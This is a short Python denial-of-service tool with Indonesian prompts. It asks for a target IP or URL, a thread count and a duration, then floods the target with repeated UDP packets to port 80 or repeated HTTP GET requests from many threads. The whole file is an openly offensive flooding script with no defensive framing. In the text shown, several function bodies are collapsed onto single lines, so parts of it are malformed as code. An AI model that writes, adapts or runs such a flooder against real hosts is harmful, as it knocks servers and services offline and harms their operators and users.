import threading, time, socket, requests

def udp_attack(ip, port, duration, thread_id): timeout = time.time() + duration sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) data = b'FROGZZ-ATTACK' * 50 while time.time() < timeout: try: sock.sendto(data, (ip, port)) print(f"[UDP-{thread_id}] Attack sent to {ip}:{port}") except: continue

def http_attack(url, duration, thread_id): timeout = time.time() + duration while time.time() < timeout: try: r = requests.get(url) print(f"[HTTP-{thread_id}] Status {r.status_code} to {url}") except: continue

def start_attack(): print("\n[!] Masukkan informasi serangan:") target = input("Target IP / Domain (cth: 1.1.1.1 / http://example.com): ") method = "UDP+HTTP" threads = int(input("Jumlah Threads (cth: 50): ")) duration = int(input("Durasi Serangan dalam detik (cth: 10): "))

print(f"\n[INFO] Menyerang {target} menggunakan metode {method} dengan {threads} threads selama {duration} detik...\n")

for i in range(threads):
    if target.startswith("http"):
        t = threading.Thread(target=http_attack, args=(target, duration, i))
    else:
        t = threading.Thread(target=udp_attack, args=(target, 80, duration, i))
    t.daemon = True
    t.start()

time.sleep(duration)
print("\n[✓] Serangan selesai!")

